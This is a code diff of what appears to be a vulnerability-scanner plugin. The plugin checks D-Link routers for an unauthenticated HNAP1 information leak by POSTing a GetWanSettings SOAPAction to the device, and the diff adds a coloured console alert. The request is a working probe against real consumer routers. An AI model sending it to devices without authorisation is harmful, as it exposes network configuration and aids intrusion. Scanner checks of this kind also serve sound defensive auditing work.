@@ -1,5 +1,3 @@
-from ..miniCurl import Curl
-from ..t  import T
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 #__author__ = '1c3z'
@@ -7,12 +5,15 @@ from ..t  import T
 # ref:http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/
 # ref:http://www.freebuf.com/vuls/64521.html
 
+from ..miniCurl import Curl
+from ..t  import T
 import urlparse
+from termcolor import cprint
 
 class P(T):
     def __init__(self):
         T.__init__(self)
-    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
+    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
         arg='http://'+ip+':'+port+'/'
         curl=Curl()
         result = {}
@@ -22,6 +23,7 @@ class P(T):
         header = 'SOAPAction: "http://purenetworks.com/HNAP1/GetWanSettings"'
         code, head, res, errcode, finalurl = curl.curl2(url,method='POST',header=header)
         if code == 200 and "xmlns:soap" in res:
+	    cprint(url + '存在unauthenticated Vul漏洞', 'yellow')
             output("D_link /HANP1 unauthenticated remote query information " + url,result,'warning')
     
 
